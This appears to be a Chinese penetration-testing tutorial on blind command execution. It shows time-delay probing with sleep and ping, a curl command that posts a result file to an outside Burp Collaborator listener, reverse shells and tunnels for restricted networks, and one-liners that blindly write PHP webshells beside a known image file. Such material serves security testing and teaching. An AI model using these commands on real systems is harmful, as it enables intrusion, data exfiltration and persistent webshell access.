## **一、引言**

在渗透测试、漏洞挖掘或安全研究的过程中，我们会遇到很多无回显的命令执行点。面对这些无回显的命令执行点，我们很难获取命令执行结果，甚至无法判断命令是否执行成功。本篇文章主要讨论面对这些无回显的命令执行点时的判断和利用方法。

##  **二、延时判断**

首先我们需要知道该点是否存在命令执行漏洞，或者我们的命令是否执行成功了。这里的研判方法有很多种，最常用的是直接通过延时判断，类似我们sql注入里的时间盲注：

> cmd=sleep 5

值得一提的是，windows下并没有sleep命令，那么如何通过时间延时的方式判断windows环境下的命令执行呢？我们可以通过回环ping来达到强制延时的效果：

> ping -n 3 127.0.0.1
>
> ping -n 4 127.0.0.1

Linux下同样试用，我们还可以通过ping命令在不同环境下的执行方式来判断目标的操作系统类型：

ping -c 3 127.0.0.1

ping -c 4 127.0.0.1

![](https://image.3001.net/images/20220208/1644311309_6202330d5a6aa81fb3dfa.jpg!small)![](https://image.3001.net/images/20220208/1644311318_620233164ea6612b5c159.jpg!small)

延时判断法是在无回显情况下最简单的判断方式，优点是能分辨操作系统、无论目标是否出网都能判断，缺点是只能判断不能利用。

##  **三、流量监听**

流量监听是渗透攻击者另一个常用的命令执行判断和利用方式，流量监听最重要的一个条件是目标系统必须能出网。

这里想先跟大家讨论下“出网”这一概念，我们所谓出不出网其实是要分不同环境和不同场景的。主要还是看防火墙和其他安全设备的配置策略，有全流量不出网、指定端口不出网、指定协议流量不出网等等。有的小伙伴在渗透时经常遇到明明dnslog能收到请求但是却无法通过nps等工具建立隧道的场景。抛开被监控软件拦截，最有可能的原因就是用户环境指定了tcp流量不出网。我们知道dns是应用层的协议，通常是基于udp的（部分极端情况也可使用tcp），因此dnslog能收到请求并不代表全流量都能出网。这种情况下我们就需要想办法建立一些其他协议的通信隧道，如dns隧道、icmp隧道等。

出网的情况下想要验证命令是否执行成功方法就太多了，我们可以用dnslog、httplog等进行漏洞验证，也可以直接建立反向代理隧道进行漏洞利用。在漏洞验证时推荐可以使用burp的Collaborator
Client功能。这是一个类似httpslog+dnslog的插件，其功能要比dnslog强大，我们可以不用搭建任何环境就能监听dns和http请求，也可以很方便的查看post请求包和cookie等。Collaborator
Client的使用方法如图：

![](https://image.3001.net/images/20220208/1644311382_62023356b6a15534492d2.jpg!small)dnslog监听示例：

![](https://image.3001.net/images/20220208/1644311430_6202338671c1619b1965a.jpg!small)

Collaborator
Client除了dns外也能记录http的请求包，我们可以把命令执行结果写在文件里，通过提交http参数的方式来查看命令执行结果。这种场景适合于没有正向访问路径的情况，如命令执行点不在web目录我们无法通过url直接访问命令执行的结果文件，只能反向提交数据或直接建立反向隧道。

这里我们保存命令执行结果到result.txt，执行以下命令通过Collaborator Client查看文件内容：

> curl -X POST -F xx=@result.txt
> <http://ta7jsmzs6ydploiv0z9bpvkd046vuk.burpcollaborator.net>

![](https://image.3001.net/images/20220208/1644311514_620233da9e08cd38b9f63.jpg!small)

## **四、** **反弹shell**

要利用一个命令执行点，最有效的方式便是反弹shell了。反弹shell的方式方法有很多，具体可以参考本公众号的上篇文章：

[
**内网代理工具与检测方法研究**](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483876&idx=1&sn=b71f016be9f345699efcbffdc27b626f&chksm=c2a1d56df5d65c7bbee6e1052d0405eab5cb6dbb98bd549459b83b5a2ab6b530cd078ca5398e&token=1585075487&lang=zh_CN&scene=21#wechat_redirect)

上一小节讲过，在tcp不出网的条件下我们可以使用dns隧道、icmp隧道、udp隧道等其他协议建立隧道。在无法用tcp协议下载远程工具的情况下，我们可以将exe程序通过powershell形式实现无文件运行。无文件的加载方式有很多，可以参考下面这篇文章：<http://www.bugsafe.cn/archives/294.html>

##  **五、** **盲写文件**

盲写文件同样适用于不出网的条件下，在全流量不出网时异常好用。我们知道在不出网的条件下建立正向连接是最有效的利用方式，而最稳定的正向连接当属webshell了。在知道web路径的情况下我们可以很方便的通过命令写入webshell，那么我们如何在不知道web路径的条件下盲写webshell呢？

盲写的思路是我们可以在网站访问的相对路径下找一个不常见的flag文件，以这个flag文件为基准利用操作系统的遍历语法在同级目录下写入webshell。

例如我们发现某站点存在一个名为sy-small-banner.png的图片，我们不需要知道该图片的绝对路径就可以通过下面的方式在该图片的同目录下创建一个名为sy-small-banner.png.php的文件。Windows下的盲写行方法：

> for /r C:\ %i in (sy-small-banner*.png) do @echo "test" > %i.php

![](https://image.3001.net/images/20220208/1644311629_6202344d57eac764d37cb.jpg!small)  
我们可以遍历每一个盘符，直到文件写成功为止。Linux下的盲写方法：

> for i in `find /home -name "sy-small-banner.png"`; do echo "text" >`basename
> $i`.php; done

实际渗透中最常见的盲写场景就是通过sql注入执行系统命令了，如果文件盲写不成功需要考虑站库分离等特殊情况。

[原文链接﻿](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483888&idx=1&sn=1b27699118e73565fa62aa73ab8fcbd8&chksm=c2a1d579f5d65c6ff6292013a5f272ccd27b940ef8efc790055259b97a85fb6b8992c9bcf435&mpshare=1&scene=1&srcid=0208XTmwC6NG4aBm5epId8as&sharer_sharetime=1644311126317&sharer_shareid=364b318b59e17770cdf42d79a4539355&version=4.0.0.6007&platform=win#rd)

